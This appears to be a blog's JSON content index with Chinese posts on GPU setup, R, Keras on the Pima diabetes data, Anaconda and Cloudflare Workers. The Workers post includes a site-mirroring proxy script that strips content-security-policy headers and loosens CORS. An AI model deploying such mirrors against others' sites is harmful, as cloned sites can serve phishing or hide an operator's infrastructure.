(Const)/job:localhost/replica:0/task:0/device:GPU:0random_uniform/max: (Const): /job:localhost/replica:0/task:0/device:GPU:02020-10-11 09:36:58.868493: I tensorflow/core/common_runtime/placer.cc:54] random_uniform/max: (Const)/job:localhost/replica:0/task:0/device:GPU:0[[1405.2429 1441.7413 1364.38 ... 1480.2251 1279.0061 1620.0938 ] [1232.6589 1344.4458 1169.7095 ... 1205.1284 1040.5566 1421.967 ] [1209.3164 1180.3206 1158.1396 ... 1200.0344 1014.03217 1222.5107 ] ... [1298.9648 1262.9236 1205.6918 ... 1396.479 1090.7253 1437.241 ] [1118.2473 1209.0151 1077.7229 ... 1180.7025 1076.4694 1139.742 ] [1200.8866 1297.2266 1260.01 ... 1289.4297 1165.2448 1433.4183 ]]2.6225805282592773 s 可以看到 GPU 已经在工作了。 同时可以在 cmd 中运行 nvidia-smi【C:\\Program Files\\NVIDIA Corporation\\NVSMInvidia-smi.exe】监控 GPU 使用情况和更改 GPU 状态。 Keras-GPUconda 直接安装即可, 注意需要先安装 tensorflow-gpu。 conda install keras-gpu Pytorch-GPU再也找不到比官网更详尽的文档了，请直接参考 https://pytorch.org/。 conda install pytorch torchvision cudatoolkit=10.0 GPU 测试程序： import torchflag = torch.cuda.is_available()print(flag)ngpu= 1# Decide which device we want to run ondevice = torch.device(\"cuda:0\" if (torch.cuda.is_available() and ngpu &gt; 0) else \"cpu\")print(device)print(torch.cuda.get_device_name(0))print(torch.rand(3,3).cuda()) 输出结果： Truecuda:0GeForce GTX 960Mtensor([[0.0208, 0.2799, 0.4918], [0.0020, 0.1067, 0.8207], [0.5531, 0.0994, 0.2108]], device='cuda:0')","categories":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"}],"tags":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://blog.mhuig.top/tags/Machine-Learning/"}]},{"title":"R 语言初步","slug":"data-mining/R语言初步","date":"2020-10-10T12:30:27.000Z","updated":"2020-10-10T12:30:27.000Z","comments":true,"path":"p/fe073ab3/","permalink":"https://blog.mhuig.top/p/fe073ab3/","excerpt":"尝试使用 R 语言进行数据处理","text":"尝试使用 R 语言进行数据处理 安装 R进入 https://www.r-project.org 下载安装包即可. 安装包，载入包的命令安装包install.packages(\"mlbench\") 载入包library(mlbench) 更新所有包update.packages(ask=FALSE, checkBuilt=TRUE) 导入数据集dataset &lt;- read.csv(\"C:\\\\R\\\\bin\\\\iris.csv\", header=FALSE) 概要分析显示头 10 行head(dataset,n=10) V1 V2 V3 V4 V51 5.1 3.5 1.4 0.2 Iris-setosa2 4.9 3.0 1.4 0.2 Iris-setosa3 4.7 3.2 1.3 0.2 Iris-setosa4 4.6 3.1 1.5 0.2 Iris-setosa5 5.0 3.6 1.4 0.2 Iris-setosa6 5.4 3.9 1.7 0.4 Iris-setosa7 4.6 3.4 1.4 0.3 Iris-setosa8 5.0 3.4 1.5 0.2 Iris-setosa9 4.4 2.9 1.4 0.2 Iris-setosa10 4.9 3.1 1.5 0.1 Iris-setosa 显示数据集的每类样本所占比例library(mlbench)data(PimaIndiansDiabetes)y &lt;- PimaIndiansDiabetes$diabetescbind(freq=table(y), percentage=prop.table(table(y))*100) freq percentageneg 500 65.10417pos 268 34.89583 每个属性的值的分布情况summary(dataset) V1 V2 V3 V4 Min. :4.300 Min. :2.000 Min. :1.000 Min. :0.100 1st Qu.:5.100 1st Qu.:2.800 1st Qu.:1.600 1st Qu.:0.300 Median :5.800 Median :3.000 Median :4.350 Median :1.300 Mean :5.843 Mean :3.054 Mean :3.759 Mean :1.199 3rd Qu.:6.400 3rd Qu.:3.300 3rd Qu.:5.100 3rd Qu.:1.800 Max. :7.900 Max. :4.400 Max. :6.900 Max. :2.500 V5 Length:150 Class :character Mode :character 可视化数据属性箱线盒# 加载数据集data(iris)# 为每个属性创建单独的框线图par(mfrow=c(1,4))for(i in 1:4) {boxplot(iris[,i], main=names(iris)[i])} 柱状图data(iris)par(mfrow=c(1,4))for(i in 1:4) {hist(iris[,i], main=names(iris)[i])} 曲线图library(lattice)data(iris)par(mfrow=c(1,4))for(i in 1:4) {plot(density(iris[,i]), main=names(iris)[i])} 条形图library(mlbench)data(BreastCancer)# 为每个分类属性创建条形图par(mfrow=c(2,4))for(i in 2:9) {counts &lt;- table(BreastCancer[,i])name &lt;- names(BreastCancer)[i]barplot(counts, main=name)} 相关图# 加载程序包library(corrplot)# 加载数据data(iris)# 计算相关性correlations &lt;- cor(iris[,1:4])# 创建相关图corrplot(correlations, method=\"circle\") 散点图# 加载数据data(iris)# 按类别着色的成对散点图pairs(Species~., data=iris, col=iris$Species) 密度图# 加载程序包library(caret)# 加载数据data(iris)# 按类值为每个属性绘制密度图x &lt;- iris[,1:4]y &lt;- iris[,5]scales &lt;- list(x=list(relation=\"free\"), y=list(relation=\"free\"))featurePlot(x=x, y=y, plot=\"density\", scales=scales)","categories":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"}],"tags":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"R","slug":"R","permalink":"https://blog.mhuig.top/tags/R/"}]},{"title":"手把手教你用 Python 开始第一个机器学习项目","slug":"data-mining/手把手教你用python开始第一个机器学习项目","date":"2020-10-10T11:43:22.000Z","updated":"2020-10-10T11:43:22.000Z","comments":true,"path":"p/110850a/","permalink":"https://blog.mhuig.top/p/110850a/","excerpt":"熟悉一个新的平台或者一个新的工具最好的方式就是从头到尾踏实的完成一个机器学习项目","text":"熟悉一个新的平台或者一个新的工具最好的方式就是从头到尾踏实的完成一个机器学习项目 这里以 PimaIndiansdiabetes.csv 数据集为例。 Download Data Set PimaIndiansdiabetes.csv 数据集介绍 1、该数据集最初来自国家糖尿病/消化/肾脏疾病研究所。数据集的目标是基于数据集中包含的某些诊断测量来诊断性的预测 患者是否患有糖尿病。 2、从较大的数据库中选择这些实例有几个约束条件。尤其是，这里的所有患者都是 Pima 印第安至少 21 岁的女性。 3、数据集由多个医学预测变量和一个目标变量组成 Outcome。预测变量包括患者的怀孕次数、BMI、胰岛素水平、年龄等。 4、数据集的内容是皮马人的医疗记录，以及过去 5 年内是否有糖尿病。所有的数据都是数字，问题是（是否有糖尿病是 1 或 0），是二分类问题。数据有 8 个属性，1 个类别： 【1】Pregnancies：怀孕次数 【2】Glucose：葡萄糖 【3】BloodPressure：血压 (mm Hg) 【4】SkinThickness：皮层厚度 (mm) 【5】Insulin：胰岛素 2 小时血清胰岛素（mu U / ml ） 【6】BMI：体重指数 （体重 / 身高）^2 ） 【7】DiabetesPedigreeFunction：糖尿病谱系功能 【8】Age：年龄 （岁） 【9】Outcome：类标变量 （0 或 1） 数据可视化了解数据集的结构现在是时候看一下我们的数据集了。当前步骤中我们从不同的角度观察数据。 加载数据集首先 import pandas 模块调用 read_csv 方法加载数据集。 from pandas import read_csv# 加载数据集filename = 'pima-indians-diabetes.csv'dataset = read_csv(filename, header=None) 显示数据实例个数、属性个数使用 pandas 中的 shape 方法查看数据集的维度特征，显示数据实例个数 (行)、属性个数（列）。 # 显示数据实例个数、属性个数dataset.shape#(768, 9) 看到有 768 个实例，9 个属性。 前 10 个样本情况使用 head 方法观察数据前 10 行。实际地仔细观察数据向来都是好办法。 # 前10个样本情况dataset.head(10) 0 1 2 3 4 5 6 7 8 0 6 148 72 35 0 33.6 0.627 50 1 1 1 85 66 29 0 26.6 0.351 31 0 2 8 183 64 0 0 23.3 0.672 32 1 3 1 89 66 23 94 28.1 0.167 21 0 4 0 137 40 35 168 43.1 2.288 33 1 5 5 116 74 0 0 25.6 0.201 30 0 6 3 78 50 32 88 31.0 0.248 26 1 7 10 115 0 0 0 35.3 0.134 29 0 8 2 197 70 45 543 30.5 0.158 53 1 9 8 125 96 0 0 0.0 0.232 54 1 显示每个属性的统计概要看一下每个属性的统计概要。 这里包括总数，均值，std，最小值，最大值以及一些百分比。 # 显示每个属性的统计概要（包括总数，均值，最小值，最大值以及一些百分比）dataset.describe() 0 1 2 3 4 5 6 7 8 count 768.000000 768.000000 768.000000 768.000000 768.000000 768.000000 768.000000 768.000000 768.000000 mean 3.845052 120.894531 69.105469 20.536458 79.799479 31.992578 0.471876 33.240885 0.348958 std 3.369578 31.972618 19.355807 15.952218 115.244002 7.884160 0.331329 11.760232 0.476951 min 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.078000 21.000000 0.000000 25% 1.000000 99.000000 62.000000 0.000000 0.000000 27.300000 0.243750 24.000000 0.000000 50% 3.000000 117.000000 72.000000 23.000000 30.500000 32.000000 0.372500 29.000000 0.000000 75% 6.000000 140.250000 80.000000 32.000000 127.250000 36.600000 0.626250 41.000000 1.000000 max 17.000000 199.000000 122.000000 99.000000 846.000000 67.100000 2.420000 81.000000 1.000000 箱线盒图导入 matplotlib，绘制每一个输入变量的箱线图。这能让我们更清晰的了解输入属性的分布情况。 from matplotlib import pyplot# 线盒图dataset.plot(kind='box')pyplot.show() 柱状图# 柱状图dataset.hist()pyplot.show() 看起来输入变量中有 3 个可能符合高斯分布。这个现象值得注意，我们可以使用基于这个假设的算法。 多变量散点图看一下变量之间的相互关系，所有属性两两一组互相对比的散点图。这种图有助于我们定位输入变量间的结构性关系。 # 多变量散点图from pandas.plotting import scatter_matrixscatter_matrix(dataset)pyplot.show() 注意下图中某些属性两两比对时延对角线出现的分组现象。这其实表明高度的相关性和可预测关系。 交叉验证交叉验证的基本思想是把在某种意义下将原始数据进行分组, 一部分做为训练集，另一部分做为验证集，首先用训练集对分类器进行训练, 再利用验证集来测试训练得到的模型，以此来做为评价分类器的性能指标。 用交叉验证的目的是为了得到可靠稳定的模型。 对数据进行 3、5、7 交叉验证，比较结果。 十折交叉验证# MLP for Pima Indians Dataset with 10-fold cross validation via sklearnfrom keras.models import Sequentialfrom keras.layers import Densefrom keras.wrappers.scikit_learn import KerasClassifierfrom sklearn.model_selection import StratifiedKFoldfrom sklearn.model_selection import cross_val_scoreimport numpy# Function to create model, required for KerasClassifierdef create_model(): # create model model = Sequential() model.add(Dense(12, input_dim=8, activation='relu')) model.add(Dense(8, activation='relu')) model.add(Dense(1, activation='sigmoid')) # Compile model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) return model# fix random seed for reproducibilityseed = 7numpy.random.seed(seed)# load pima indians datasetdataset = numpy.loadtxt(\"pima-indians-diabetes.csv\", delimiter=\",\")# split into input (X) and output (Y) variablesX = dataset[:, 0:8]Y = dataset[:, 8]# create modelmodel = KerasClassifier(build_fn=create_model, epochs=150, batch_size=10)# evaluate using 10-fold cross validationkfold = StratifiedKFold(n_splits=10, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 3 交叉验证# 3 交叉验证kfold = StratifiedKFold(n_splits=3, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 5 交叉验证kfold = StratifiedKFold(n_splits=5, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 7 交叉验证# 7 交叉验证kfold = StratifiedKFold(n_splits=7, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 结果 交叉验证 Result 3 0.75 5 0.7252864837646484 7 0.7383295553071159 10 0.7382946014404297 改变神经网络结构加深，加宽，看看什么结构对模型性能有较大影响。 加深# 改变神经网络结构，（加深，加宽），看看什么结构对模型性能有较大影响。# 加深def create_model_1(): # create model model = Sequential() model.add(Dense(12, input_dim=8, activation='relu')) model.add(Dense(12, input_dim=12,activation='relu')) model.add(Dense(12, input_dim=12,activation='relu')) model.add(Dense(12,input_dim=12, activation='relu')) model.add(Dense(12,input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12,activation='relu')) model.add(Dense(8, input_dim=8,activation='relu')) model.add(Dense(8, input_dim=8,activation='relu')) model.add(Dense(8, input_dim=8,activation='relu')) model.add(Dense(8, input_dim=8,activation='relu')) model.add(Dense(1, activation='sigmoid')) # Compile model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) return modelmodel = KerasClassifier(build_fn=create_model_1, epochs=150, batch_size=10)kfold = StratifiedKFold(n_splits=3, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 加宽# 改变神经网络结构，（加深，加宽），看看什么结构对模型性能有较大影响。# 加宽def create_model_2(): # create model model = Sequential() model.add(Dense(24, input_dim=8, activation='relu')) model.add(Dense(16, activation='relu')) model.add(Dense(1, activation='sigmoid')) # Compile model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) return modelmodel = KerasClassifier(build_fn=create_model_2, epochs=150, batch_size=10)kfold = StratifiedKFold(n_splits=3, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 加深加宽# 改变神经网络结构，（加深，加宽），看看什么结构对模型性能有较大影响。# 加宽 加深def create_model_2(): # create model model = Sequential() model.add(Dense(24, input_dim=8, activation='relu')) model.add(Dense(24, input_dim=24, activation='relu')) model.add(Dense(24, input_dim=24, activation='relu')) model.add(Dense(24, input_dim=24, activation='relu')) model.add(Dense(24, input_dim=24, activation='relu')) model.add(Dense(12, input_dim=24, activation='relu')) model.add(Dense(12, input_dim=12, activation='relu')) model.add(Dense(12, input_dim=12, activation='relu')) model.add(Dense(12, input_dim=12, activation='relu')) model.add(Dense(12, input_dim=12, activation='relu')) model.add(Dense(12, input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12, activation='relu')) model.add(Dense(8, input_dim=12, activation='relu')) model.add(Dense(1, activation='sigmoid')) # Compile model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) return modelmodel = KerasClassifier(build_fn=create_model_2, epochs=150, batch_size=10)kfold = StratifiedKFold(n_splits=3, shuffle=True, random_state=seed)results = cross_val_score(model, X, Y, cv=kfold)print(results.mean()) 结果 操作 Resault 加深 0.7096354166666666 加宽 0.7057291666666666 加深加宽 0.7174479166666666 更深的模型，意味着更好的非线性表达能力，可以学习更加复杂的变换，从而可以拟合更加复杂的特征输入。 网络更深，每一层要做的事情也更加简单了。 上面就是网络加深带来的两个主要好处，更强大的表达能力和逐层的特征学习。 而宽度就起到了另外一个作用，那就是让每一层学习到更加丰富的特征，比如不同方向，不同频率的纹理特征。 可视化训练过程# 可视化训练过程（损失函数关系图，精确度关系图）import matplotlib.pyplot as plt# Fit the modelmodel = KerasClassifier(build_fn=create_model, epochs=150, batch_size=10)history = model.fit(X, Y, validation_split=0.33, epochs=150, batch_size=10, verbose=0)# list all data in historyprint(history.history.keys())# summarize history for accuracyplt.plot(history.history['accuracy'])plt.plot(history.history['val_accuracy'])plt.title('model accuracy')plt.ylabel('accuracy')plt.xlabel('epoch')plt.legend(['train', 'test'], loc='upper left')plt.show()# summarize history for lossplt.plot(history.history['loss'])plt.plot(history.history['val_loss'])plt.title('model loss')plt.ylabel('loss')plt.xlabel('epoch')plt.legend(['train', 'test'], loc='upper left')plt.show() 源码","categories":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"}],"tags":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://blog.mhuig.top/tags/Machine-Learning/"}]},{"title":"How to Setup Your Python Environment for Machine Learning With Anaconda","slug":"data-mining/How to Setup Your Python Environment for Machine Learning with Anaconda","date":"2020-09-11T14:30:22.000Z","updated":"2020-09-11T14:30:22.000Z","comments":true,"path":"p/2f550c8c/","permalink":"https://blog.mhuig.top/p/2f550c8c/","excerpt":"In this tutorial, we will cover the following steps: 1.Download Anaconda 2.Install Anaconda 3.Start and Update Anaconda 4.Update scikit-learn Library 5.Install Deep Learning Libraries","text":"In this tutorial, we will cover the following steps: 1.Download Anaconda 2.Install Anaconda 3.Start and Update Anaconda 4.Update scikit-learn Library 5.Install Deep Learning Libraries Download AnacondaIn this step, we will download the Anaconda Python package for your platform. Install AnacondaIn this step, we will install the Anaconda Python software on your system.This step assumes you have sufficient administrative privileges to install software on your system. Start and Update AnacondaIn this step, we will confirm that your Anaconda Python environment is up to date. Anaconda comes with a suite of graphical tools called Anaconda Navigator. You can start Anaconda Navigator by opening it from your application launcher. Conda is fast, simple, it’s hard for error messages to hide, and you can quickly confirm your environment is installed and working correctly. 1.Open a terminal (command line window). 2.Confirm conda is installed correctly, by typing: conda -Vconda 4.8.2 3.Confirm Python is installed correctly by typing: python -VPython 3.7.6 4.Confirm your conda environment is up-to-date, type: conda update condaconda update anaconda You may need to install some packages and confirm the updates. 5.Confirm your SciPy environment. The script below will print the version number of the key SciPy libraries you require for machine learning development, specifically: SciPy, NumPy, Matplotlib, Pandas, Statsmodels, and Scikit-learn.You can type “python” and type the commands in directly. Alternatively, I recommend opening a text editor and copy-pasting the script into your editor. Update scikit-learn LibraryIn this step, we will update the main library used for machine learning in Python called scikit-learn. Update scikit-learn to the latest version.At the time of writing, the version of scikit-learn shipped with Anaconda is out of date (0.17.1 instead of 0.18.1). You can update a specific library using the conda command; below is an example of updating scikit-learn to the latest version.At the terminal, type: conda update scikit-learn Alternatively, you can update a library to a specific version by typing: conda install -c anaconda scikit-learn Install Deep Learning Librariesconda install theanoconda install -c conda-forge tensorflowconda install kerasconda install graphviz SummaryVersion First MLPDownload Data Set","categories":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"}],"tags":[{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://blog.mhuig.top/tags/Machine-Learning/"}]},{"title":"初探 Cloudflare Workers 边缘计算","slug":"web/初探CloudflareWorkers边缘计算","date":"2020-08-31T11:53:40.000Z","updated":"2020-08-31T11:53:40.000Z","comments":true,"path":"p/4a0f523a/","permalink":"https://blog.mhuig.top/p/4a0f523a/","excerpt":"","text":"Edge Computing 尝试在边缘运行 JavaScript 什么是边缘计算边缘运算（Edge computing），又译为边缘计算，是一种分散式运算的架构，将应用程序、数据资料与服务的运算，由网络中心节点，移往网络逻辑上的边缘节点来处理。边缘计算将原本完全由中心节点处理大型服务加以分解，切割成更小与更容易管理的部分，分散到边缘节点去处理。边缘节点更接近于用户终端装置，可以加快资料的处理与传送速度，减少延迟。在这种架构下，资料的分析与知识的产生，更接近于数据资料的来源，因此更适合处理大数据。 OpenStack（是一个由 NASA 和 Rackspace 合作研发并发起的，以 Apache 许可证授权的自由软件和开放源代码项目）社区的定义概念： “边缘计算是为应用开发者和服务提供商在网络的边缘侧提供云服务和 IT 环境服务；目标是在靠近数据输入或用户的地方提供计算、存储和网络带宽”。 章鱼理论秒懂边缘计算章鱼理论：用 \"脚\" 解决问题的边缘计算！ 作为无脊椎动物中智商最高的一种动物，章鱼拥有巨量的神经元，但 60% 分布在章鱼的八条腿（腕足）上，脑部仅有 40%。 也就是说： 警告：本文从以下开始跑题。 == 需要 M03-GLORIA 程序特殊访问权限 == 正在读取资料。请稍等.......[拒绝访问][该数据已被删除]正在读取备份。请稍等.......本博客边缘计算的搭建方案本博客目前采用 Vercel、Cloudflare、GithubPages 多线部署，未来可能会考虑添加██████等其他线路。笔者在此解释 Cloudflare 线路的边缘计算部署方案。正如你所见，静态页面托管存储在 Github 仓库██████中，并开启GitHub Pages 服务，使用Cloudflare Workers 实现边缘计算处理逻辑，LeanCloud 数据库存储网站动态数据。笔者在这里只谈部署思路，由于███████████████████████████████████，相信应该不会有人愿意开源公开自己的后端程序，安全策略以及██████████████████████等等。实现网站镜像目前 Cloudflare 线路即为 GithubPages 的镜像站，我不说相信你也可以看出来，当然我也可以随时切换为 Vercel 或者██████或者██████的镜像站。在网络边缘拦截用户请求，并修改请求中的request.url.hostname,将对用户请求的域解析替换为原始真实 URL，实现隐藏真实网络基础设施的目的。具体实现可以查阅相关文档/** * An object with different URLs to fetch * @param {Object} ORIGINS */const ORIGINS = { \"starwarsapi.yourdomain.com\": \"swapi.co\", \"google.yourdomain.com\": \"google.com\",}async function handleRequest(request) { const url = new URL(request.url) // Check if incoming hostname is a key in the ORIGINS object if (url.hostname in ORIGINS) { const target = ORIGINS[url.hostname] url.hostname = target // If it is, proxy request to that third party origin return fetch(url.toString(), request) } // Otherwise, process request as normal return fetch(request)}addEventListener(\"fetch\", event =&gt; { event.respondWith(handleRequest(event.request))})隐藏前端 API 密钥由于调用数据库 API 需要使用 AppID 和 AppKey：而直接将他们写在前端页面存在安全风险，因此笔者将数据库 API 密钥直接写在了 Cloudflare Worker 中。以本站的评论系统为例，在前端页面插入伪造的 API 密钥以作混淆，下图一看就知道是伪造的密钥。在网络边缘拦截用户请求，判断请求合法性，动态更改请求标头替换为真实的 API 密钥，并向后端数据库转发请求，实现数据交互时隐藏 API 密钥。具体实现可以查阅相关文档自定义防火墙规则从 CF-IPCountry HTTP 标头检索 IP 地理位置信息，以判断访问者合法性██████████████████，对于非法访问者████████████████████████████。笔者配合使用████████████数据库实现动态████████████████████████。How does Cloudflare handle HTTP Request headers?Configuring Cloudflare IP Geolocation记录请求日志由于目前 Cloudflare Workers 没有███████████的功能██████████████████，因此笔者使用 Leancloud 数据库的REST API 发送 HTTP 请求来与 数据库 进行交互。Cloudflare Workers 默认在事件的response发送完成后结束边缘的相关进程，这里笔者使用event.waitUntil(promise Promise),延长事件的生存期，而不会阻止事件的response发送。使用此方法可以通知运行时以等待需要比正常的发送响应时间更长的时间运行的任务（例如，日志记录，对第三方服务的分析，流和缓存）。将所有请求记录到数据库中，以便需要时调查取证或者█████████。HTTP2 server push多路复用，是 HTTP / 2 众多协议优化中最令人振奋的特性，它大大降低了网络延迟对性能的影响，而对于资源之间的依赖关系导致的 “延迟”，Server Push 则提供了手动优化方案。通常，只有在浏览器请求某个资源的时候，服务器才会向浏览器发送该资源。Server Push 则允许服务器在收到浏览器的请求之前，主动向浏览器推送资源。比如说，网站首页引用了一个 CSS 文件。浏览器在请求首页时，服务器除了返回首页的 HTML 之外，可以将其引用的 CSS 文件也一并推给客户端。本站在返回的请求中添加 HTTP 标头实现 HTTP2 server push。if(request.headers.get(\"content-type\")==\"text/html; charset=utf-8\"){ response.headers.set(\"Link\", \"&lt;/css/style.css&gt;; rel=preload; as=style,&lt;/js/app.js&gt;; rel=preload; as=script, &lt;https://cdn.jsdelivr.net&gt;; rel=preconnect; crossorigin, &lt;https://cdn.jsdelivr.net&gt;; rel=dns-prefetch\")}具体实现可以查阅相关文档CORS header proxy由于██████████████████需要前端实现跨域，可以直接添加 HTTP 标头实现。const corsHeaders = { \"Access-Control-Allow-Origin\": \"*\", \"Access-Control-Allow-Methods\": \"GET, HEAD, POST, OPTIONS\", \"Access-Control-Allow-Headers\": \"Content-Type\",}具体实现可以查阅相关文档其他应用更多 Examples[文件已删除]搭建其他镜像站上面介绍镜像自己的博客，如法炮制，你也可以镜像其他网站，例如 Github、█████████、█████████、█████████等，请勿用于非法用途，否则后果自负。下面是一个随便在百度中搜索到的脚本，几乎随便一搜都可以找到它，大家不会都用一个吧。// 你想镜像的站点const upstream = 'zh.wikipedia.org' // 针对移动端适配站点，没有就和保持和上面一致const upstream_mobile = 'zh.wikipedia.org' // 禁止某些地区访问const blocked_region = [] // 禁止自访问const blocked_ip_address = ['0.0.0.0', '127.0.0.1'] // 你想镜像的站点const replace_dict = { '$upstream': '$custom_domain', '//zh.wikipedia.org': ''} // 剩下的就不用管了addEventListener('fetch', event =&gt; { event.respondWith(fetchAndApply(event.request));}) async function fetchAndApply(request) { const region = request.headers.get('cf-ipcountry').toUpperCase(); const ip_address = request.headers.get('cf-connecting-ip'); const user_agent = request.headers.get('user-agent'); let response = null; let url = new URL(request.url); let url_host = url.host; if (url.protocol == 'http:') { url.protocol = 'https:' response = Response.redirect(url.href); return response; } if (await device_status(user_agent)) { upstream_domain = upstream } else { upstream_domain = upstream_mobile } url.host = upstream_domain; if (blocked_region.includes(region)) { response = new Response('Access denied: WorkersProxy is not available in your region yet.', { status: 403 }); } else if(blocked_ip_address.includes(ip_address)){ response = new Response('Access denied: Your IP address is blocked by WorkersProxy.', { status: 403 }); } else{ let method = request.method; let request_headers = request.headers; let new_request_headers = new Headers(request_headers); new_request_headers.set('Host', upstream_domain); new_request_headers.set('Referer', url.href); let original_response = await fetch(url.href, { method: method, headers: new_request_headers }) let original_response_clone = original_response.clone(); let original_text = null; let response_headers = original_response.headers; let new_response_headers = new Headers(response_headers); let status = original_response.status; new_response_headers.set('access-control-allow-origin', '*'); new_response_headers.set('access-control-allow-credentials', true); new_response_headers.delete('content-security-policy'); new_response_headers.delete('content-security-policy-report-only'); new_response_headers.delete('clear-site-data'); const content_type = new_response_headers.get('content-type'); if (content_type.includes('text/html') &amp;&amp; content_type.includes('UTF-8')) { original_text = await replace_response_text(original_response_clone, upstream_domain, url_host); } else { original_text = original_response_clone.body } response = new Response(original_text, { status, headers: new_response_headers }) } return response;} async function replace_response_text(response, upstream_domain, host_name) { let text = await response.text() var i, j; for (i in replace_dict) { j = replace_dict[i] if (i == '$upstream') { i = upstream_domain } else if (i == '$custom_domain') { i = host_name } if (j == '$upstream') { j = upstream_domain } else if (j == '$custom_domain') { j = host_name } let re = new RegExp(i, 'g') text = text.replace(re, j); } return text;} async function device_status (user_agent_info) { var agents = [\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\", \"iPod\"]; var flag = true; for (var v = 0; v &lt; agents.length; v++) { if (user_agent_info.indexOf(agents[v]) &gt; 0) { flag = false; break; } } return flag;}Cloudflare workers blogcloudflare-worker-blog一个在 Github 上的开源实例，████████████████████████████████████████████████████████████████████████████████████Cloudflare workers + Github 实现的动态博客系统█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████。。jsproxyjsproxy 一个基于浏览器端 JS 实现的在线代理，█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████。项目主要用于以下技术的研究：网站镜像 / 沙盒化钓鱼网站检测技术前端资源访问加速█████████████████████████████，否则█████████████。加速 Google Analyticscloudflare-workers-async-google-analyticsThe Cloudflare Workers implementation of an async Google Analytics.██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████。以上代码，请勿将其用于非法用途，否则后果自负。 严禁未经授权的人员进行访问肇事者将被监控，定位并处理","categories":[{"name":"边缘计算","slug":"边缘计算","permalink":"https://blog.mhuig.top/categories/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/"}],"tags":[{"name":"边缘计算","slug":"边缘计算","permalink":"https://blog.mhuig.top/tags/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/"}]},{"title":"","slug":"notes/Spark","date":"2020-05-06T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-spark/","permalink":"https://blog.mhuig.top/p/notes-spark/","excerpt":"","text":".fa-secondary{opacity:.4} Spark Spark 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Spark","slug":"大数据/Spark","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Spark/"}],"tags":[{"name":"Spark","slug":"Spark","permalink":"https://blog.mhuig.top/tags/Spark/"}]},{"title":"","slug":"notes/Ubuntu","date":"2020-05-05T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-ubuntu/","permalink":"https://blog.mhuig.top/p/notes-ubuntu/","excerpt":"","text":"Ubuntu Ubuntu 开始阅读","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Ubuntu","slug":"操作系统/Ubuntu","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Ubuntu/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.mhuig.top/tags/Ubuntu/"}]},{"title":"Travellings 开往下一个地方","slug":"pen/Travellings开往下一个地方","date":"2020-05-04T11:47:43.000Z","updated":"2020-05-04T11:47:43.000Z","comments":true,"path":"p/4bd2472f/","permalink":"https://blog.mhuig.top/p/4bd2472f/","excerpt":"互联网将人与人之间的距离大大减小，却还是形成了大大小小的孤岛。只有熟人间才知道彼此，而陌生人永远只能是陌生人。","text":"互联网将人与人之间的距离大大减小，却还是形成了大大小小的孤岛。只有熟人间才知道彼此，而陌生人永远只能是陌生人。 什么是开往 - 友链接力开往 - 友链助力是传统友链的增强，我们不必互相知道了解彼此，标准的审查让友好的朋友加入我们，只需要一个徽标，占用一块位置，我们所有人都联系在了一起，简单而又强大。 开往 - 友链接力 旅行愉快日常大家可以点击 banner 或者 footer 栏中的 “Travellings” 图标去参观其他博主的博客，祝大家旅行愉快。 